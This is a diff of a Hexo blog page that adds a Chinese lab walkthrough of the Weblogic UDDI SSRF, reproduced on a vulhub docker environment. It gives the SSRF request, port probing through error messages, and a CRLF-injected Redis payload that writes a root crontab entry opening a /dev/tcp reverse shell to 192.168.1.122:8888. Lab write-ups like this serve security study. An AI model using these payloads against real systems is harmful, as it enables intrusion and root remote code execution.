@@ -1,114 +1,262 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-
 <head>
-  <head>
   <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="author" content="viggo" />
-  <title>greetdawn&#39;s Blog - The God love people</title>
-  <meta name="keywords" content="Web安全,Linux,Python,Life">
-  <meta name="description" content="Love coding,Love life!">
-  <link rel="shortcut icon" href="/favicon.ico">
   
-<link rel="stylesheet" href="/css/hclonely.css">
-<link rel="stylesheet" href="//fonts.loli.net/css?family=Arimo:400,700,400italic.css">
-<link rel="stylesheet" href="/css/fonts/linecons/css/linecons.min.css">
-<link rel="stylesheet" href="/css/fonts/fontawesome/css/all.min.css">
-<link rel="stylesheet" href="/css/bootstrap.min.css">
-<link rel="stylesheet" href="/css/xenon-core.min.css">
-<link rel="stylesheet" href="/css/xenon-components.min.css">
-<link rel="stylesheet" href="/css/xenon-skins.min.css">
-<link rel="stylesheet" href="/css/nav.min.css">
-
-  
-<script src="/js/jquery-1.11.1.min.js"></script>
-
-  <script>
-    var userDefinedSearchData = {"custom":false,"thisSearch":"https://www.baidu.com/s?wd=","thisSearchIcon":"url(https://www.baidu.com/favicon.ico)","hotStatus":true,"data":[{"name":"百度","img":"url(https://www.baidu.com/favicon.ico)","url":"https://www.baidu.com/s?wd="}]};
-    var expandAll = false;
-  </script>
-  
-<script src="/js/header.js"></script>
-
-  <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
-  <!--[if lt IE 9]>
-        
-<script src="/js/html5shiv.min.js"></script>
-
-        
-<script src="/js/respond.min.js"></script>
-
-    <![endif]-->
-  <!-- / FB Open Graph -->
+  <title>Weblogic ssrf攻击实战 | greetdawn&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="article">
-  <meta property="og:url" content="http://www.greetdawn.top/2020/08/22/web-security/ssrf/ssrf-weblogic-redis/index.html">
-  <meta property="og:title" content="greetdawn&#39;s Blog - The God love people">
-  <meta property="og:description" content="Love coding,Love life!">
-  <meta property="og:site_name" content="greetdawn&#39;s Blog - The God love people">
+<meta property="og:title" content="Weblogic ssrf攻击实战">
+<meta property="og:url" content="http://www.greetdawn.top/2020/08/22/web-security/ssrf/ssrf-weblogic-redis/index.html">
+<meta property="og:site_name" content="greetdawn&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/3.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121140634.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121140953.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121141658.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121144835.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121144912.png">
+<meta property="article:published_time" content="2020-08-22T02:56:44.000Z">
+<meta property="article:modified_time" content="2021-01-29T08:14:32.298Z">
+<meta property="article:author" content="丨greetdawn丨">
+<meta property="article:tag" content="redis">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/3.jpg">
   
-  <meta property="og:image" content="/images/webstack_banner_cn.png">
-  
-  <!-- / Twitter Cards -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="greetdawn&#39;s Blog - The God love people">
-  <meta name="twitter:description" content="Love coding,Love life!">
-  
-  <meta name="twitter:image" content="/images/webstack_banner_cn.png">
+    <link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
   
   
-  <!-- 直接添加html内容即可 -->
-<!-- 可设置多行 -->
+    <link rel="shortcut icon" href="/favicon.ico">
   
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
-</head>
+  
+<link rel="stylesheet" href="/css/typing.css">
 
-</head>
+  
+<link rel="stylesheet" href="/css/donate.css">
 
-
-
-
-  <footer class="main-footer sticky footer-type-1">
-  <div class="footer-inner">
-    <!-- Add your copyright text here -->
-    <p>
-      
-      &copy; 2020 - 2022
-      <a href="javascript:void(0);"><strong>丨greetdawn丨</strong></a> | Design by <a href="http://viggoz.com" target="_blank"><strong>Viggo</strong></a> | Power by <a href="https://hexo.io/" target="_blank"><strong>Hexo</strong></a> & <a href="https://github.com/HCLonely/hexo-theme-webstack/" target="_blank"><strong>hexo-theme-webstack</strong></a>
-    </p>
+  
+  
     
-    <div class="go-up">
-      <a href="#" rel="go-top">
-        <i class="fas fa-angle-up"></i>
-      </a>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  
+    
+      <body>
+    
+  
+      <div id="container" class="container">
+        <article id="post-web-security/ssrf/ssrf-weblogic-redis" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <header id="header" class="header">
+  <nav class="mobile-nav">
+    <h1 class="nickname">NickName</h1>
+    <ul class="mobile-nav-menu">
+      <label for="mobile-menu-toggle"><a id="menu-button">&#9776; Menu</a></label>
+      <input type="checkbox" id="mobile-menu-toggle"/>
+      <ul class="mobile-nav-link">
+        
+        <a href="/">Home</a>
+        
+        <a href="/archives">Archives</a>
+        
+        <a href="/about">About</a>
+        
+      </ul>
+    </ul>
+  </nav>
+	
+		<nav id="main-nav" class="main-nav nav-left">
+	
+	
+	  <a class="main-nav-link" href="/">Home</a>
+	
+	  <a class="main-nav-link" href="/archives">Archives</a>
+	
+	  <a class="main-nav-link" href="/about">About</a>
+	
+  </nav>
+</header>
+
+  <hr/>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Weblogic ssrf攻击实战
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry typo" itemprop="articleBody">
+      
+        <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/3.jpg" alt="3"></p>
+<span id="more"></span>
+
+<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
+<p>环境采用vulhub上现有docker环境进行复现</p>
+<pre class="language-none"><code class="language-none">docker-compose build
+docker-compose up -d</code></pre>
+
+<p>访问<code>http://your-ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用。</p>
+<h2 id="ssrf漏洞测试"><a href="#ssrf漏洞测试" class="headerlink" title="ssrf漏洞测试"></a>ssrf漏洞测试</h2><p>漏洞位置</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;your-ip:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp</code></pre>
+
+<p>payload</p>
+<pre class="language-none"><code class="language-none">?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001</code></pre>
+
+<p>这里默认存在一个远程资源的加载，且未经过严格过滤</p>
+<h2 id="ssrf漏洞探测内网主机端口"><a href="#ssrf漏洞探测内网主机端口" class="headerlink" title="ssrf漏洞探测内网主机端口"></a>ssrf漏洞探测内网主机端口</h2><p>可访问的端口会得到错误，一般会返回status code,如果访问的是非http的端口，则返回<code> which did not have a valid SOAP content-type</code></p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121140634.png"></p>
+<p>修改访问一个不存在的端口，则返回<code>could not connect over HTTP to server</code></p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121140953.png"></p>
+<p>通过返回的错误不同，我们可以判断出内网主机开放了哪些端口。</p>
+<h2 id="ssrf漏洞redis反弹shell"><a href="#ssrf漏洞redis反弹shell" class="headerlink" title="ssrf漏洞redis反弹shell"></a>ssrf漏洞redis反弹shell</h2><p>探测内网的redis发现目标在<code>192.168.128.2</code></p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121141658.png"></p>
+<p>定时任务payload</p>
+<pre class="language-none"><code class="language-none">test
+
+set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.122&#x2F;8888 0&gt;&amp;1\n\n\n\n&quot;
+config set dir &#x2F;etc&#x2F;
+config set dbfilename crontab
+save
+
+aaa</code></pre>
+
+<p>进行url编码</p>
+<pre class="language-none"><code class="language-none">test%0A%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.122%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0Aconfig%20set%20dir%20%2Fetc%2F%0Aconfig%20set%20dbfilename%20crontab%0Asave%0A%0Aaaa</code></pre>
+
+<p>将其中的<code>%0a</code>替换成<code>%0d%0a</code></p>
+<pre class="language-none"><code class="language-none">test%0d%0a%0d%0aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.122%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0d%0aconfig%20set%20dir%20%2Fetc%2F%0d%0aconfig%20set%20dbfilename%20crontab%0d%0asave%0d%0a%0d%0aaaa</code></pre>
+
+<p>发起攻击</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121144835.png"></p>
+<p>主机成功上线</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121144912.png"></p>
+
+      
+      
     </div>
+    <footer class="article-footer">
+      <ul class="article-meta">
+        <li>
+          <span class="label">Published Date:</span>
+          <a href="/2020/08/22/web-security/ssrf/ssrf-weblogic-redis/" class="article-date">
+  <time class="dt-published" datetime="2020-08-22T02:56:44.000Z" itemprop="datePublished">2020-08-22</time>
+</a>
+
+        </li>
+        
+          <li>
+            <span class="label">Category:</span>
+            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
   </div>
-</footer>
-</div>
-</div>
-
-<script src="/js/bootstrap.min.js"></script>
-<script src="/js/TweenMax.min.js"></script>
-<script src="/js/resizeable.min.js"></script>
-<script src="/js/joinable.js"></script>
-<script src="/js/xenon-api.min.js"></script>
-<script src="/js/xenon-toggles.min.js"></script>
-<script src="/js/xenon-custom.min.js"></script>
 
 
-<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+          </li>
+        
+        
+          <li>
+            <span class="label">Tag:</span>
+            
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/redis/" rel="tag">redis</a></li></ul>
+
+
+          </li>
+        
+        <hr/>
+      </ul>
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav" class="article-nav">
+  
+    <a href="/2020/10/12/wechat/%E6%A0%A1%E9%AA%8C%E7%AD%BE%E5%90%8D%E7%9A%84%E6%96%B9%E6%B3%95/" id="article-nav-newer" class="article-nav-link-wrap newer">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          校验签名是否被更改
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/08/16/web-security/ssrf/ssrf-redis-getshell-ctf/" id="article-nav-older" class="article-nav-link-wrap older">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">SSRF主从复制getshell</div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
 
 
 
-<script src="/js/lozad.min.js"></script>
+
+
+
+
+
+
+
+      </div>
+      
+    <footer id="footer" class="post-footer footer">
+      
+      <hr/>
+      <div id="footerContent" class="footer-content">
+        <p>ipsum dolor sit amet, <strong>consectetur adipiscing elit.</strong> Fusce eget urna vitae velit <em>eleifend interdum at ac nisi. In nec ligula lacus. Cum sociis natoque</em> penatibus et magnis dis parturient montes, nascetur ridiculus mus. Sed eu cursus erat, ut dapibus quam. Post</p>
+
+
+      </div>
+    </footer>
+
+      
+
+
+
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
 
 
 
   
-  <!-- 直接添加html内容即可 -->
-<!-- 可设置多行 -->
-  
-</body>
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
 
+
+
+
+<script src="/js/typing.js"></script>
+
+<!--[if lt IE 9]>
+<script src="https://cdn.jsdelivr.net/npm/html5shiv@3/dist/html5shiv.min.js"></script>
+<![endif]-->
+
+
+
+
+
+
+
+    </div>
+  </body>
 </html>
